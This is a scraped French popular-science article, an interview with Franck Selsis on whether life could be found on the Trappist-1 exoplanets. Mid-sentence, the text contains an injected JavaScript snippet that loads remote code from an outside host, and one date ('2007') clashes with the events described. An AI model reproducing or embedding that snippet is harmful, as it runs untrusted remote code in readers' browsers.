{"title": "Trappist-1 : comment y chercher la vie ? Les réponses de l'astrophysicien Franck Selsis", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "03/09/2017", "content": "Ce 31 août 2017, une équipe de chercheurs a annoncé la possibilité que de l'eau existe sur plusieurs exoplanètes autour de l'étoile Trappist-1. La nouvelle a eu un beau succès même si aucune preuve n'a été apportée. Si cette annonce a eu un écho, c'est que ces exoplanètes sont présentées comme les premières où pourront être repérées des biosignatures d'ici quelques décennies. L'astrophysicien et exobiologiste Franck Selsis, qui étudie ce système planétaire, avait alors répondu à ces questions. Ses réponses sont utiles aujourd'hui pour décrypter cette dernière annonce. Article paru le 28 février 2007 Le système planétaire de  Trappist-1 , découvert en mai 2016 par une équipe internationale chapeautée par l'astronome belge Michaël Gillon (que l'on peut voir dans la vidéo ci-dessous), vient de gagner en célébrité. Tout avait commencé avec la mise en évidence de 3  exoplanètes  autour de cette  étoile  grâce à l'instrument Trappist ( TRAnsiting Planets and PlanetesImals Small Telescope ), un  télescope  de seulement 60 cm de diamètre à l'observatoire de La Silla ( ESO ), au Chili, géré par l'université de Liège. Les astronomes belges ont poursuivi leurs travaux sur cette  étoile  avec une équipe internationale impliquant notamment des chercheurs du  Laboratoire d’astrophysique de Bordeaux , du Laboratoire de  météorologie  dynamique (CNRS/UPMC/École polytechnique/ENS), du laboratoire  Astrophysique , instrumentation et  modélisation  (CNRS/CEA/Université Paris Diderot) mais aussi de la Nasa. En combinant des données obtenues à l'aide des instruments de Trappist mais aussi du télescope  Spitzer , ces chercheurs ont ajouté quatre exoplanètes au tableau de chasse, comme ils l'ont expliqué dans un article de  Nature . Le 6 octobre 2016, le télescope Trappist Nord était inauguré à l'Observatoire de l'Oukaïmeden, au Maroc. Collaboration de chercheurs de l'université de Liège et de l'université Cadi Ayyad de Marrakech, ce télescope permettra d'observer durant plus de 250 nuits par an les exoplanètes et les comètes. © université de Liège Trappist-1, une bonne cible pour étudier l'habitabilité La découverte est d'importance pour trois raisons :  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  ces exoplanètes sont de tailles terrestres, ce système se trouve à seulement 40  années-lumière  environ, ces exoplanètes apparaissent comme potentiellement habitables. Mais à quel point et pourra-t-on un jour y découvrir de la vie ? Pour le savoir, Futura-Sciences s'est tourné vers un des membres de l'équipe qui étudie les exoplanètes autour de Trappist-1, l'astrophysicien Franck Selsis. Spécialiste des  atmosphères  planétaires, ce chercheur a participé à la première détection d'eau dans l'atmosphère d'une exoplanète avec le  télescope spatial Hubble . Il travaille également au sein du consortium qui a découvert  Proxima b , une exoplanète potentiellement habitable autour de  Proxima , l'étoile la plus proche du  Soleil . Voici les réponses de Franck Selsis à nos questions : L'astrophysicien Franck Selsis étudie les atmosphères planétaires et l'exobiologie. ©  University of Exeter                               Comment a-t-on découvert quatre nouvelles exoplanètes autour de Trappist-1 ? Franck Selsis :  Comme avec les trois premières, en utilisant la méthode des  transits  planétaires. Les observations de l'étoile se sont poursuivies au sol, notamment avec les télescopes automatisés de Trappist Sud, au Chili, et de Trappist Nord, au Maroc. On a également fait appel à Spitzer, le célèbre télescope spatial de la Nasa qui observe dans l' infrarouge . Nous avons pu ainsi bénéficier de 20 jours d'observations presque continues avec cet instrument de la Nasa. Pourquoi n'avez-vous pas utilisé la  méthode des vitesses radiales  pour estimer les  masses  de ces exoplanètes ? Franck Selsis :  Trappist-1 est suivie en vitesses radiales avec un  spectrographe  infrarouge appelé Carmenes, situé à Calar Alto en Espagne. L'infrarouge est approprié car Trappist-1 est une étoile de petite taille, et surtout beaucoup plus froide que le Soleil. Elle ne rayonne donc pas principalement dans le visible mais dans l'infrarouge. Ces observations sont cependant difficiles car l'étoile est peu lumineuse et le signal Doppler qu'il faut en extraire est très faible. On peut tout de même espérer poser quelques contraintes, avec  Carmenes  mais aussi avec de futurs spectrographes qui devraient être opérationnels dans un avenir proche. Par exemple Spirou, qui équipera le télescope Canada-France-Hawaï, et le projet NIRPS ( Near Infra Red Planet Searcher ), mené conjointement avec l'université de Montréal et l'observatoire de Genève. Quelques vues d’artiste de l’aspect supposé – océans d’eau liquide inclus – des sept planètes orbitant autour de Trappist-1, à comparer à des photographies des planètes rocheuses de notre Système Solaire. Des informations relatives à la taille et aux périodes orbitales de chaque planète sont également données, à titre comparatif. L’ensemble des planètes de Trappist-1 est de type exoterre. © Nasa, Eso                               Alors comment avez-vous pu estimer ces masses ? Franck Selsis :  En utilisant la méthode des variations de temps de transit, ou  TTV  ( Transit Timing Variations ). Le principe en est simple à comprendre même s'il implique des techniques complexes de calcul en mécanique céleste. S'il n'existait qu'une seule exoplanète autour d'une étoile, elle aurait une  orbite  régulière avec une période de transit constante. Mais si d'autres planètes sont suffisamment massives ou proches, leur attraction gravitationnelle peut ralentir ou accélérer son  mouvement  orbital. On observe alors des variations du temps de transit. Dans le cas de Trappist-1, ces variations sont importantes car six planètes au moins sont en  résonance  orbitale. C'est-à-dire que le rapport des  périodes orbitales  de deux planètes parmi ces six est un  nombre rationnel  (une fraction de deux entiers). Par exemple quand la planète dite « e » fait deux tours autour de son étoile, la d en fait trois. La mesure de ces variations permet de contraindre les masses et les  excentricités  des orbites de chacune des planètes, de la b à la g. Ces estimations ne sont pas encore précises et il faut continuer à accumuler des observations et peut-être les compléter de mesures par la méthode des vitesses radiales. Aux barres d'erreurs près, et en combinant les mesures de masses à celles des rayons, on trouve que les six premières exoplanètes de Trappist-1 sont plutôt moins denses que la  Terre , ce qui impliquerait une forte proportion de composés peu denses, dont le candidat le plus probable est l'eau.  Trappist-1f en particulier a une faible densité, similaire à celles des  lunes  glacées de  Jupiter ,  Europe  par exemple. De manière générale d'ailleurs, les propriétés du système Trappist-1 rappellent celles de Jupiter et ses satellites : sa compacité, les résonances orbitales, la similarité des tailles, les  forces de marée , jusqu'à la taille de Trappist-1 qui est proche de celle de Jupiter. Sur ce diagramme figurent, à titre comparatif, les tailles des planètes nouvellement découvertes autour de la naine rouge Trappist-1, ainsi que celles des satellites de Jupiter au sein de notre Système solaire. © Eso, O. Furtak                        Ce n'est pas la première fois que l'on découvre un système planétaire avec un grand nombre d'exoplanètes. Alors, pourquoi cet engouement pour Trappist-1 ? Franck Selsis :  Il y a de multiples raisons. La première est qu'il est tout à la fois proche du  Système solaire , autour d'une étoile de faible masse, donc très peu lumineuse, et avec des exoplanètes de tailles terrestres. On peut donc envisager d'analyser la composition de l'atmosphère de ces exoplanètes, si elles en possèdent, dans un avenir proche. Ce sera par exemple possible avec le  télescope James Webb  qui sera lancé en 2018. Or, il ne suffit pas qu'une planète soit, ou ne soit pas, dans la  zone d'habitabilité  d'une étoile pour que de l'eau  liquide  puisse ou ne puisse pas y exister. La nature de l'atmosphère qu'elle peut posséder est un paramètre crucial dont dépend l'habitabilité réelle d'une exoplanète. Dans le Système solaire par exemple, Mars se situe dans cette fameuse zone habitable mais ne possède pas l'atmosphère épaisse qui lui permettrait d'avoir de l'eau liquide en surface.  Les exoplanètes de Trappist-1 sont potentiellement un excellent laboratoire pour tester nos idées sur l'habitabilité réelle des exoplanètes de tailles terrestres et en particulier quand elles sont autour des naines rouges. Cette animation de la Nasa montre une interprétation de ce à quoi pourraient ressembler les sept planètes découvertes en février 2017 autour de l'étoile Trappist-1, une naine rouge située à 40 années-lumière de nous. Elles sont supposées rocheuses et trois pourraient être habitables. Les astronomes pourront en étudier les atmosphères, si elles existent. © Futura, Nasa Justement, n'est-il pas problématique que Trappist-1 soit une  naine rouge  ? Ce genre d'étoile a une jeunesse agitée, avec des flots de  rayons X , d' ultraviolets  et de particules, capables d'éroder une atmosphère planétaire. Franck Selsis :  C'est bien ce que l'on voudrait savoir et le meilleur moyen d'en avoir le cœur net, c'est de faire des observations. Il est possible qu'en fonction des caractéristiques de l'atmosphère d'une planète, son épaisseur, son contenu en eau liquide et aussi en fonction des interactions entre la  magnétosphère  et l' ionosphère  avec les  vents stellaires , une exoplanète autour d'une naine rouge puisse rester habitable. Personnellement, je me pose des questions car en appliquant à la jeune Terre plusieurs des arguments qui font douter de l'habitabilité des exoplanètes autour des naines rouges, on aboutit à la conclusion qu'elle ne devrait pas être habitable. Donc, soit les modèles théoriques surestiment beaucoup les pertes atmosphériques, soit les échanges entre le  manteau  et l'atmosphère sont à prendre en compte. L'eau et le  gaz  présents dans le manteau et libérés progressivement en surface pourraient être protégés de la phase de forte activité stellaire initiale. Par ailleurs, pour des naines rouges de grandes tailles, la période juvénile d'activité est plus longue pour les faibles masses stellaires. Elle culmine pour des étoiles dont la masse vaut 15 à 20 % de la masse du Soleil mais elle diminue pour les étoiles encore plus petites. Les signes d'activité intense disparaissent pour les naines ultrafroides, c'est-à-dire à moins de 10 % de la masse solaire. Or, Trappist-1 est en dessous de cette limite. Enfin, si l'on peut confirmer une faible densité impliquant une grande richesse en eau et en composés volatils pour certaines planètes de Trappist-1, la question sera d'une certaine façon réglée. Une vue d'artiste de la surface d'une des exoplanètes de Trappist-1 qui pourrait posséder un océan. © Adrian Mann                               Autour d'une naine rouge, la zone d'habitabilité est très proche de l'étoile et les forces de marée doivent imposer des rotations  synchrones . Alors quid de l'habitabilité réelle ? Franck Selsis :  La synchronisation de la rotation (le fait que les planètes présentent toujours la même face à l'étoile, comme la Lune vis-à-vis de la Terre) semble difficile à éviter car les forces de marée produites par l'étoile sur des planètes si proches sont très fortes. Mais nos  simulations climatiques  montrent que ce n'est pas un obstacle à la capacité de maintenir des océans de surface. Au contraire, dans certains cas, cette situation permet d'avoir de l'eau liquide à la surface de l'hémisphère éclairé en l'absence d' effet de serre  de l'atmosphère. Les planètes autour de Trappist-1 sont très proches les unes des autres. Cela a-t-il un impact sur l'habitabilité ? Franck Selsis :  En présence de forts effets de marée, une planète évolue normalement vers la synchronisation, une  obliquité  nulle et une orbite circulaire. Mais en présence d'autres planètes, les interactions gravitationnelles empêchent l'orbite d'être totalement circulaire, lui conférant une faible excentricité. En présence d'une excentricité, les forces de marées déforment et chauffent la planète. En ce qui concerne l'habitabilité, ce phénomène pourrait avoir des effets négatifs ou positifs. Négatifs si ce chauffage interne est très intense ou s'ajoute à un ensoleillement fort, mais positifs si ce coup de pouce des marées vient renforcer un ensoleillement faible. Autour de Jupiter par exemple, les marées chauffent  Io  avec des conséquences dramatiques mais permettent à Europe d'abriter un océan interne. Les explications plus détaillées de Franck Selsis sur les atmosphères des exoplanètes et la question de leur habitabilité. © École normale supérieure Supposons malgré tout, disons sur Trappist-1f, qu'il existe une atmosphère et des conditions propices à l'apparition de la vie, pourrait-on la mettre en évidence ? Franck Selsis :  Vaste question sur laquelle je suis extrêmement prudent. Comme  Carl Sagan , je pense qu'à une affirmation extraordinaire il faut une preuve extraordinaire. Pour vous répondre, il faudrait avoir une définition convaincante de ce que doit être une biosignature (j'écarte la question d'une technosignature). Avec le télescope James Webb, ou à plus long terme avec le futur télescope géant européen (l' E-ELT ,  European Extremely Large Telescope ), on devrait être en mesure de détecter et de quantifier la présence de certaines  molécules , l' oxygène  et l'eau. Mais pourra-t-on affirmer pour autant la présence d'une forme de vie si, par exemple, le teneur en oxygène est similaire à celle de l'atmosphère de la Terre ? Peut-être, mais cela impliquerait de nombreuses observations complémentaires et beaucoup de temps. Je me suis précisément posé la question de ce que devrait être une bonne biosignature dans mon travail de thèse. Prenons l'exemple d'une planète qui serait aussi massive que  Vénus  et initialement riche en eau. Le rayonnement de son étoile pourrait avoir dissocié les molécules d'H 2 O laissant partir dans l'espace les molécules de H 2  mais retenant dans l'atmosphère les molécules d'O 2 , du fait de sa  gravité . On aurait donc une atmosphère riche en oxygène et pour autant son origine ne serait pas biologique (incidemment, l'oxygène de Vénus semble, probablement, avoir migré dans son manteau). Plus généralement, qu'est ce qui pourrait nous assurer que des molécules généralement associées à la vie n'ont pas été produites par des processus  abiotiques  (sans intervention du vivant) ? Pour tenter d'éviter ce problème j'ai proposé de chercher à détecter tout à la fois des molécules d' ozone , de  gaz carbonique  et d'eau. Mais, d'une part, c'est une signature terrestre très spécifique et le vivant pourrait générer d'autres compositions. Et, d'autre part, ce n'est pas parce que je ne suis pas parvenu à obtenir par simulation des atmosphères d'exoplanètes avec cette signature par des processus non biologiques que ce n'est pas possible. Rien ne dit que mon exploration des phénomènes possibles est exhaustive. Je pense donc qu'il faudra attendre d'avoir analysé et bien compris les atmosphères d'un très grand nombre d'exoplanètes avant de pouvoir raisonnablement se dire capable de reconnaître de façon indiscutable une atmosphère transformé par la vie. Il n'en reste pas moins que le système de Trappist-1 devrait être un excellent laboratoire à notre portée pour débuter ce travail de recherche d'une vie ailleurs que dans le Système solaire. Les explications plus détaillées de Franck Selsis sur le problème de la détection et de l'interprétation des biosignatures. © Académie des sciences  Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  comment etre astrophysicien  |  comment devenir astrophysicien  |  franck hertz  |  franck delplace  |  delplace franck  |  experience de franck hertz  |  astrophysicien  |  astrophysicien etudes  |  metier astrophysicien  |  astrophysicien metier", "theme": "sciences"}